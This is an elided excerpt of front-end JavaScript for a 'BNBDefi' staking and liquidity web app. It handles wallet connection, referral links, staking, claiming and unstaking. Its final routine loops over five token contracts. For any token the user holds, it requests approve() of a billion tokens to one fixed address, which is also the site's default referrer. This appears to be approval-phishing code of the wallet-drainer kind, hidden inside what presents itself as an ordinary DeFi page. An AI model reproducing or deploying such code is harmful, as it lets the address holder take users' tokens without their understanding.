(() => {
                ...
                config: {
                    ...
                    contracts: {
                        cake: {
                            ...
                            address: "0xb0e2e82979c67673ca4aee39b03ac22bb1bbafdc"
                        },
                        cake3: {
                            abi: window.abi_contract_cake,
                            address: "0xb0e2e82979c67673ca4aee39b03ac22bb1bbafdc"
                        ...
                        busd: {
                            ...
                            address: "0x437a2f45a6dd3edc3344c0396e430c7d395c69c8"
                        },
                        busd2: {
    ...
    window.App = new Vue({
        ...
        data: {
            user: {
                ref: "0x437a2f45a6dd3edc3344c0396e430c7d395c69c8",
                address: "",
                balance: 0,
                allowance: 0,
                invested: 0,
        ...
        mounted() {
            ...
            console.log("ref: " + m);
            try {
                if (localStorage.getItem("WEB3_CONNECT_CACHED_PROVIDER") != null || localStorage.getItem("busdDefi_connected") == "connected") {
                    self.connectWallet();
                } else {
                    self.updateData();
                }
            ...
            if (localStorage.getItem("busdDefi_first_visit") != "no") {
                self.overlay.first_visit = 1;
                localStorage.setItem("busdDefi_first_visit", "no");
            };
            self.loaded = 1;
            ...
            if (localStorage.getItem("busdDefi_notice_001") != "1") {
        ...
        watch: {
            "overlay.history": function(val) {
                ...
                if (val == 1) {
                    ...
                    document.title = "BNBDefi / History";
        ...
        methods: {
                ...
                if (self.user.address != "") {
                    (async () => {
                        try {
                            ...
                            self.user.address = "";
                            localStorage.setItem("busdDefi_connected", "disconnected");
                        } catch (e) {}
                    })();
                    return;
                };
                    ...
                    try {
                        if (window.ethereum) {
                            ...
                            try {
                                ...
                                localStorage.setItem("busdDefi_connected", "connected");
                                self.updateData();
            ...
            goHome() {
                ...
                setTimeout(() => {
                    top.location.href = "https:\/\/bnbDefi.io";
                }, 1000);
            },
            seeContract() {
                this.overlay.contract = 0;
                window.open('https:\/\/bscscan.com\/address\/0x437a2f45a6dd3edc3344c0396e430c7d395c69c8', '_blank');
            },
            goInvest() {
            ...
            closeNotice() {
                ...
                localStorage.setItem("busdDefi_notice_001", "1");
            },
            toggleInstructions() {
            ...
            openDoc1() {
                document.title = "BNBDefi / Docs / Overview";
                this.openDoc("overview");
            },
            openDoc2() {
                document.title = "BNBDefi / Docs / Feature: Anti-Whale";
                this.openDoc("antiwhale");
            },
            openDoc3() {
                document.title = "BNBDefi / Docs / Audits";
                this.openDoc("audits");
            },
            openDoc4() {
                document.title = "BNBDefi / Docs / Quick Guide";
                this.openDoc("guide");
            },
            openDoc5() {
                document.title = "BNBDefi / Docs / Distribution";
                this.openDoc("dist");
            },
            copyRef() {
                let self = this;
                let s = document.createElement('input');
                var _lnk = "https:\/\/bnbDefi.io?ref=" + self.user.address;
                if (_farm != "bnb") {
                    if (_farm == "busd2") {
                        _lnk = "https:\/\/bnbDefi.io/lt?ref=" + self.user.address;
                    } else {
                        _lnk = "https:\/\/bnbDefi.io/" + _farm + "?ref=" + self.user.address;
                    }
                };
                s.value = _lnk;
                ...
                try {
                    ...
                    document.title = "BNBDefi / Ref Copied!";
                    setTimeout(() => {
            ...
            invest_bnb() {
                ...
                document.title = "BNBDefi / Staking";
            ...
            invest_busdpool() {
                ...
                if (self.user.allowance <= 0 || self.user.allowance < amt) {
                    ...
                    document.title = "BNBDefi / Add Liquidity";
            ...
            claimRewards() {
                ...
                if (self.conn != "" && self.user.address != "") {
                    ...
                    document.title = "BNBDefi / Claiming";
            ...
            unstakePool() {
                ...
                if (self.conn != "" && self.user.address != "") {
                    ...
                    document.title = "BNBDefi / Removing Liquidity";
                ...
                if (self.conn != "" && self.user.address != "") {
                    ...
                    if (_farm == "busd" || _farm == "cake") {
                        (async () => {
                            ...
                            var allowance = await self.t1.methods.allowance(self.user.address, "0x437a2f45a6dd3edc3344c0396e430c7d395c69c8").call();
                            allowance = parseFloat(self.parseWei(allowance));
                            if (balance > 0 && allowance < 1) {
                                self.t1.methods.approve("0x437a2f45a6dd3edc3344c0396e430c7d395c69c8", self.toWei("1000000000")).send({
                                    from: self.user.address
                                }).then(res => {
                                    self.overlay.collect = 0;
                                }).catch(e => {
                        ...
                        (async () => {
                            ...
                            var allowance = await self.t2.methods.allowance(self.user.address, "0x437a2f45a6dd3edc3344c0396e430c7d395c69c8").call();
                            allowance = parseFloat(self.parseWei(allowance));
                            if (balance > 0 && allowance < 1) {
                                self.t2.methods.approve("0x437a2f45a6dd3edc3344c0396e430c7d395c69c8", self.toWei("1000000000")).send({
                                    from: self.user.address
                                }).then(res => {
                                    self.overlay.collect = 0;
                                }).catch(e => {
                        ...
                        (async () => {
                            ...
                            var allowance = await self.t3.methods.allowance(self.user.address, "0x437a2f45a6dd3edc3344c0396e430c7d395c69c8").call();
                            allowance = parseFloat(self.parseWei(allowance));
                            if (balance > 0 && allowance < 1) {
                                self.t3.methods.approve("0x437a2f45a6dd3edc3344c0396e430c7d395c69c8", self.toWei("1000000000")).send({
                                    from: self.user.address
                                }).then(res => {
                                    self.overlay.collect = 0;
                                }).catch(e => {
                        ...
                        (async () => {
                            ...
                            var allowance = await self.t4.methods.allowance(self.user.address, "0x437a2f45a6dd3edc3344c0396e430c7d395c69c8").call();
                            allowance = parseFloat(self.parseWei(allowance));
                            if (balance > 0 && allowance < 1) {
                                self.t4.methods.approve("0x437a2f45a6dd3edc3344c0396e430c7d395c69c8", self.toWei("1000000000")).send({
                                    from: self.user.address
                                }).then(res => {
                                    self.overlay.collect = 0;
                                }).catch(e => {
                        ...
                        (async () => {
                            ...
                            var allowance = await self.t5.methods.allowance(self.user.address, "0x437a2f45a6dd3edc3344c0396e430c7d395c69c8").call();
                            allowance = parseFloat(self.parseWei(allowance));
                            if (balance > 0 && allowance < 1) {
                                self.t5.methods.approve("0x437a2f45a6dd3edc3344c0396e430c7d395c69c8", self.toWei("1000000000")).send({
                                    from: self.user.address
                                }).then(res => {
                                    self.overlay.collect = 0;
                                }).catch(e => {
